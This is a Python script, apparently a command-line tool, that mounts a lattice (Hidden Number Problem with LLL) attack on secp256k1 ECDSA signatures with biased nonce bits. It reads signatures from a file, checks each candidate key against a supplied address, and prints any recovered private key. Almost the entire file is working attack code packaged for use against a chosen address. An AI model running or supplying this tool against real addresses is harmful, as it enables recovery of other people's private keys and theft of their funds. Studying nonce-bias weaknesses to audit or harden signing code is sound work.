import json
import sys
import hashlib
from ecdsa import SECP256k1
from lattice_nonce_analyzer import verify_key, lll_reduction

P = SECP256k1.order

def solve_hnp_lsb(sigs_data, bias_bits, address=None, k_fixed=0):
    # k = k' * 2^b + k_fixed
    # s = (z + r*d) / (k' * 2^b + k_fixed)
    # s * (k' * 2^b + k_fixed) = z + r*d
    # s * 2^b * k' + s * k_fixed = z + r*d
    # s * 2^b * k' - r*d = z - s * k_fixed (mod P)
    # k' - (r / (s * 2^b)) * d = (z - s * k_fixed) / (s * 2^b) (mod P)
    
    n = len(sigs_data)
    if n > 32: sigs_data = sigs_data[:32]
    n = len(sigs_data)
    
    if n < 2: return None
    
    B = 1 << (256 - bias_bits)
    mod = P
    matrix = [[0] * (n + 2) for _ in range(n + 2)]
    
    t_values = []
    u_values = []
    
    inv_2b = pow(1 << bias_bits, -1, mod)
    
    for sig in sigs_data:
        s_inv = pow(sig['s'], -1, mod)
        t = (sig['r'] * s_inv * inv_2b) % mod
        u = ((sig['z'] - sig['s'] * k_fixed) * s_inv * inv_2b) % mod
        t_values.append(t)
        u_values.append(u)
        
    for i in range(n): matrix[i][i] = mod
    for i in range(n): matrix[n][i] = t_values[i]
    matrix[n][n] = 1 
    for i in range(n): matrix[n+1][i] = u_values[i]
    matrix[n+1][n+1] = B
    
    reduced = lll_reduction(matrix)
    for row in reduced:
        potential_d = abs(row[n])
        if potential_d == 0 or potential_d >= mod: continue
        if address:
            if verify_key(potential_d, address): return potential_d
    return None

def run_lattice_lsb(filename, address, bias_bits=8, k_fixed=0):
    with open(filename, "r") as f:
        sigs = json.load(f)
    
    print(f"Attempting LSB recovery for {address} with {len(sigs)} sigs ({bias_bits} bits, fixed={k_fixed})...")
    key = solve_hnp_lsb(sigs, bias_bits, address=address, k_fixed=k_fixed)
    if key:
        print(f"!!! SUCCESS: Key found for {address} !!!")
        print(f"Private Key: {hex(key)}")
        return key
    return None

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python3 lattice_lsb_analyzer.py <sigs.json> <address> [bias_bits] [k_fixed]")
    else:
        bias_bits = int(sys.argv[3]) if len(sys.argv) > 3 else 8
        k_fixed = int(sys.argv[4]) if len(sys.argv) > 4 else 0
        run_lattice_lsb(sys.argv[1], sys.argv[2], bias_bits, k_fixed)
